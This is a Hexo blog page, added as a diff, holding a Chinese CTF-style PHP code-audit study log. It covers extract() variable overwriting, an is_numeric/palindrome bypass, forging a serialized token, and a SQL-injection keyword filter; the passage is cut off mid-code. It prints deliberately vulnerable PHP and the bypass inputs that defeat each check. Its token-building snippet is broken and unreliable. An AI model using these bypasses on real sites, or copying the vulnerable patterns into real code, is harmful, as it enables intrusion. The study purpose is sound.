@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon-120x120.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"w01n.github.io","root":"/","scheme":"Pisces","version":"7.7.2","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="PHP代码审计学习记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP代码审计学习记录">
+<meta property="og:url" content="https://w01n.github.io/2020/03/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="oslo&#39;S Blog">
+<meta property="og:description" content="PHP代码审计学习记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-03-25T04:10:10.000Z">
+<meta property="article:modified_time" content="2020-03-25T04:10:10.000Z">
+<meta property="article:author" content="Oslo">
+<meta property="article:tag" content="Code">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://w01n.github.io/2020/03/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>PHP代码审计学习记录 | oslo'S Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="oslo'S Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">oslo'S Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Self Recording</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">5</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://w01n.github.io/2020/03/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Oslo">
+      <meta itemprop="description" content="You guilty , You died">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="oslo'S Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP代码审计学习记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-25 12:10:10" itemprop="dateCreated datePublished" datetime="2020-03-25T12:10:10+08:00">2020-03-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CodeAudit/" itemprop="url" rel="index"><span itemprop="name">CodeAudit</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CodeAudit/Recording/" itemprop="url" rel="index"><span itemprop="name">Recording</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>34k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>31 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="PHP代码审计学习记录"><a href="#PHP代码审计学习记录" class="headerlink" title="PHP代码审计学习记录"></a>PHP代码审计学习记录</h1><a id="more"></a>
+
+<p>一些简单的PHP代码审计学习记录</p>
+<p>下面都是以CTF的形式来学习PHP代码审计 绕过各种PHP函数和方法和利用一些特性来获取flag</p>
+<h2 id="0x00-PHP的extract变量覆盖"><a href="#0x00-PHP的extract变量覆盖" class="headerlink" title="0x00 PHP的extract变量覆盖"></a>0x00 PHP的extract变量覆盖</h2><p>先了解一下extract函数是什么</p>
+<p>extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目</p>
+<p>通俗点就是可以从数组中的键值取出来然后赋值给其他变量 变量名就是键值名</p>
+<p>然后这里有两道题可以看一下 一道GET一道POST</p>
+<p>GET型 源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag&#x3D;&#39;xxx&#39;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content&#x3D;trim(file_get_contents($flag));</span><br><span class="line">if($shiyan&#x3D;&#x3D;$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&#39;Oh.no&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里开头就用来extract从url里面提取GET的参数 后面看到有shiyan和flag两个参数 trim是用来过滤两边其他字符串的 后面那个函数用来提取文件中内容复制给字符串 所以这里从url里面提取到的参数就会变量覆盖</p>
+<p>从url里面提取shiyan作为变量名赋值为空 提取flag作为变量名赋值为url里面提交的参数</p>
+<p>只要满足$content=$shiyan就行</p>
+<p>shiyan参数直接留空 flag参数给个不存在的文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shiyan&#x3D;&amp;flag&#x3D;111</span><br></pre></td></tr></table></figure>
+
+<p>直接这样就ok</p>
+<p>POST型 源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; “POST”) &#123; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">     extract($_POST);</span><br><span class="line"></span><br><span class="line">        if ($pass &#x3D;&#x3D; $thepassword_123) &#123; ?&gt;</span><br><span class="line"></span><br><span class="line">           &lt;div class&#x3D;”alert alert-success”&gt;</span><br><span class="line"></span><br><span class="line">               &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;&#x2F;code&gt;</span><br><span class="line"></span><br><span class="line">           &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;?php &#125; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php &#125; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>跟上面一样 直接就extract了POST的数据</p>
+<p>这里要我们$pass==$thepassword_123 我们直接post一个pass</p>
+<p>使用变量覆盖使得这两个的变量值都为空</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass&#x3D;&amp;thepassword_123&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>直接就ok</p>
+<h2 id="0x01-绕过过滤空白字符"><a href="#0x01-绕过过滤空白字符" class="headerlink" title="0x01 绕过过滤空白字符"></a>0x01 绕过过滤空白字符</h2><p>先看源码： 代码我就弄得紧凑一点了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$info &#x3D; &quot;&quot;; &#x2F;&#x2F;单引号中是绝对字符串 双引号中的变量可以被解析并赋予变量值 其余则为字符串</span><br><span class="line">$req &#x3D; [];  &#x2F;&#x2F;数组</span><br><span class="line">$flag&#x3D;&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line">ini_set(&quot;display_error&quot;, false); &#x2F;&#x2F;为一个配置选项设置值 关闭错误显示</span><br><span class="line">error_reporting(0); &#x2F;&#x2F;关闭所有PHP错误报告</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;number&#39;]))&#123;</span><br><span class="line">   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); &#x2F;&#x2F;HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span><br><span class="line">   die(&quot;have a fun!!&quot;); &#x2F;&#x2F;die — 等同于 exit()</span><br><span class="line">&#125; </span><br><span class="line">foreach([$_GET, $_POST] as $global_var) &#123;  &#x2F;&#x2F;foreach 语法结构提供了遍历数组的简单方式 </span><br><span class="line">    foreach($global_var as $key &#x3D;&gt; $value) &#123;  &#x2F;&#x2F;取出键值0 &#x3D;&#x3D;》121</span><br><span class="line">        $value &#x3D; trim($value);  &#x2F;&#x2F;trim — 去除字符串首尾处的空白字符（或者其他字符）得到121</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] &#x3D; addslashes($value); &#x2F;&#x2F; is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span><br><span class="line">    &#125; &#x2F;&#x2F;转义前面加\  加入数组req里面</span><br><span class="line">&#125; </span><br><span class="line">function is_palindrome_number($number) &#123; &#x2F;&#x2F;回文数字</span><br><span class="line">    $number &#x3D; strval($number); &#x2F;&#x2F;strval — 获取变量的字符串值 字符串121</span><br><span class="line">    $i &#x3D; 0; </span><br><span class="line">    $j &#x3D; strlen($number) - 1; &#x2F;&#x2F;strlen — 获取字符串长度 从0开始 减1</span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !&#x3D;&#x3D; $number[$j]) &#123; &#x2F;&#x2F;判断回文</span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line">if(is_numeric($_REQUEST[&#39;number&#39;])) &#x2F;&#x2F;is_numeric — 检测变量是否为数字或数字字符串 绕过使条件为假 再前面加个%00 要求1</span><br><span class="line">&#123;</span><br><span class="line">   $info&#x3D;&quot;sorry, you cann&#39;t input a number!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">elseif($req[&#39;number&#39;]!&#x3D;strval(intval($req[&#39;number&#39;]))) &#x2F;&#x2F;intval — 获取变量的整数值  先取整数再变为字符串121 要求2</span><br><span class="line">&#123;</span><br><span class="line">     $info &#x3D; &quot;number must be equal to it&#39;s integer!! &quot;;  </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">     $value1 &#x3D; intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 &#x3D; intval(strrev($req[&quot;number&quot;]));  &#x2F;&#x2F;取反</span><br><span class="line">     if($value1!&#x3D;$value2)&#123; &#x2F;&#x2F;要求3</span><br><span class="line">          $info&#x3D;&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;&#x2F;&#x2F;要求4 使之判断为假 回文数前面加个字符</span><br><span class="line">              $info &#x3D; &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">             $info&#x3D;$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure>
+
+<p>开头定义了有字符串 数组 和我们想要的flag 然后下面那个设置是关闭了错误回显</p>
+<p>然后判断GET参数number 没有的话就会提示 拿去md5解一下 是source.txt 然后就会得到这个源码</p>
+<p>然后取出参数 判断字符串 添加转义字符然后再加到req数组里面</p>
+<p>函数is_palindrome_number是判断是否是个回文数字 就是正反都是一样的</p>
+<p>然后再看一下的一些要求 我都列出来了 都分析一下</p>
+<p>(1)函数is_numeric判断是否是数字 我们可以在前面加个%00或者重新POST一个number来覆盖掉</p>
+<p>(2)$req[‘number’]==strval(intval($req[‘number’])) </p>
+<p>(3)intval($req[“number”])==intval(strrev($req[“number”]))</p>
+<p>要求2和3大致上都是差不多的 只要满足回文且是正常的数字就行了</p>
+<p>(4)不满足is_palindrome_number函数 使之返回为假</p>
+<p>这里只需要在前面加个特殊字符就ok 同时也要满足2和3的条件 所以就需要我们构造一下</p>
+<p>然后找到一个字符是可以的 其他的字符可以自己fuzz一下 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;+121&#39;&#x3D;&#x3D;&#39;121&#39; &amp;&amp; intval(&#39;121+&#39;)&#x3D;&#x3D;121 &#x2F;&#x2F;+就是%2B</span><br></pre></td></tr></table></figure>
+
+<p>所以最后我们构造如下即可出flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?number&#x3D;%00%2B121s</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-多重加密"><a href="#0x02-多重加密" class="headerlink" title="0x02 多重加密"></a>0x02 多重加密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;common.php&#39;;</span><br><span class="line">    $requset &#x3D; array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">    &#x2F;&#x2F;把一个或多个数组合并为一个数组</span><br><span class="line">    class db</span><br><span class="line">    &#123;</span><br><span class="line">        public $where;</span><br><span class="line">        function __wakeup()</span><br><span class="line">        &#123;</span><br><span class="line">            if(!empty($this-&gt;where))</span><br><span class="line">            &#123;</span><br><span class="line">                $this-&gt;select($this-&gt;where);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        function select($where)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql &#x3D; mysql_query(&#39;select * from user where &#39;.$where);</span><br><span class="line">            &#x2F;&#x2F;函数执行一条 MySQL 查询。</span><br><span class="line">            return @mysql_fetch_array($sql);</span><br><span class="line">            &#x2F;&#x2F;从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($requset[&#39;token&#39;]))</span><br><span class="line">    &#x2F;&#x2F;测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span><br><span class="line">    &#123;</span><br><span class="line">        $login &#x3D; unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));</span><br><span class="line">        &#x2F;&#x2F;gzuncompress:进行字符串压缩 解压缩</span><br><span class="line">        &#x2F;&#x2F;unserialize: 将已序列化的字符串还原回 PHP 的值 反序列化</span><br><span class="line"></span><br><span class="line">        $db &#x3D; new db();</span><br><span class="line">        $row &#x3D; $db-&gt;select(&#39;user&#x3D;\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);</span><br><span class="line">        &#x2F;&#x2F;mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">        if($login[&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else if($row[&#39;pass&#39;] !&#x3D;&#x3D; $login[&#39;pass&#39;])&#123;</span><br><span class="line">            echo &#39;unserialize injection!!&#39;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&#39;Location: index.php?error&#x3D;1&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们看一下源码 重点关注代码中的echo $flag的条件  上面的都是数据库操作什么的先不管</p>
+<p>if($login[‘user’] === ‘ichunqiu’)  而$login[‘user’]又是从上面的</p>
+<p>$login = unserialize(gzuncompress(base64_decode($requset[‘token’]))); 各种转变出来的</p>
+<p>先base64解码 再解压缩 再反序列化成PHP代码里面的值</p>
+<p>所以我们就需要自己写几句PHP来获取一下这个token token需要先序列化一下 然后再压缩一下 最后再base64</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; array([&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;);</span><br><span class="line">$token &#x3D; base64_encode(gzcompress(serialize($token)));</span><br><span class="line">echo $token;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后这里token=eJxLtDK0qs60MrBOAuJaAB5uBBQ=</p>
+<p>带进URL里面直接GET提交即可</p>
+<h2 id="0x03-SQL注入之WITH-ROLLUP绕过"><a href="#0x03-SQL注入之WITH-ROLLUP绕过" class="headerlink" title="0x03 SQL注入之WITH ROLLUP绕过"></a>0x03 SQL注入之WITH ROLLUP绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); &#x2F;&#x2F;关闭错误报告</span><br><span class="line">if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) &#123;</span><br><span class="line">    echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;input name&#x3D;&quot;uname&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;input name&#x3D;&quot;pwd&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;&#x2F;form&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;检测变量是否是数组</span><br><span class="line">        $StrValue&#x3D;implode($StrValue);</span><br><span class="line">&#x2F;&#x2F;返回由数组元素组合成的字符串</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;&#x2F;&quot;.$ArrReq.&quot;&#x2F;is&quot;,$StrValue)&#x3D;&#x3D;1)&#123;   </span><br><span class="line">&#x2F;&#x2F;匹配成功一次后就会停止匹配</span><br><span class="line"></span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key&#x3D;&gt;$value)&#123; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;遍历数组</span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line">$con &#x3D; mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">    die(&#39;Could not connect: &#39; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db&#x3D;&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">&#x2F;&#x2F;设置活动的 MySQL 数据库</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM interest WHERE uname &#x3D; &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">&#x2F;&#x2F;执行一条 MySQL 查询</span><br><span class="line">if 